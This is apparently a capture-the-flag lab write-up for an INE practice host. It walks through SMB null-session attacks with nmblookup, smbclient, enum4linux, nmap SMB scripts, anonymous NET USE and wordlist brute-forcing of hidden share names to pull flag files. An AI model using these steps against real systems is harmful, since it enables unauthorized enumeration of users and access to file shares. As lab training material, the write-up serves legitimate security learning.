# Null Session

### Flag 1

Display info about windows machine<br>
-A IP_ADDRESS
```
nmblookup -A demo.ine.local
```

File server active

![1.1](./imgs/1.1.png)

Same as windows command:
```
nbtstat -A demo.ine.local
```

Enumerate file shares<br>
-L list services<br>
-N no password
```
smbclient -L //demo.ine.local -N
```

![1.2](./imgs/1.2.png)

Access public share and get flag
```
smbclient //demo.ine.local/public -N
cd .hidden
get flag_1
```

![1.3](./imgs/1.3.png)

Same as windows command:
```
NET VIEW demo.ine.local
NET USE \\demo.ine.local\$IPC '' /u:''
```

### Flag 2

-A fully enumerate target
```
enum4linux -A demo.ine.local
```

or

-S shares<br>
-U users<br>
-P password policy
```
enum4linux -S demo.ine.local
enum4linux -U demo.ine.local
enum4linux -P demo.ine.local
```
or 

```
nmap demo.ine.local --script=smb-enum-shares
nmap demo.ine.local --script=smb-enum-users
```

Users:

![2.1](./imgs/2.1.png)

Password policy:

![2.2](./imgs/2.2.png)

Michael and Raymond don't show up here so they're non-browsable

![2.3](./imgs/2.3.png)

Access denied for Raymond's share

Access Michael's share and get flag
```
smbclient //demo.ine.local/michael -N
cd dir
cd flag_2
get -
```

![2.4](./imgs/2.4.png)

### Flag 3

Brute force share enumeration
-s SHARE_LIST 
```
enum4linux -s ~/Desktop/wordlists/100-common-passwords.txt demo.ine.local
```

hidden share "shadow1" found

![3.1](./imgs/3.1.png)

```
smbclient //demo.ine.local/shadow1 -N
get flag_3 -
```

![3.2](./imgs/3.2.png)